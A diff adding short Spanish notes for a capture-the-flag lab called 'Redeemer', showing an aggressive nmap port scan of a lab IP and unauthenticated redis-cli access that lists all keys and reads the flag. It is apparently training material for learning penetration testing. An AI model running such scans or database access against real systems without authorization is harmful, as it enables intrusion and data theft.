@@ -1,0 +1,21 @@
+REDEEMER:
+----------------
+
+rediris-cli - ddbb - tcp - 6379
+
+1- nmap:
+----------------
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  10.129.157.218
+
+2- redis-cli:
+----------------
+apt install redis-tools
+
+3- redis-cli connection:
+----------------
+	$> redis-cli -h 10.129.157.218
+	$> info -> info del host
+	$> select -> seleccionar algo de la ddbb
+	$>
+	$> keys * -> ver todas las keys
+	$> get flag -> obtener key flag
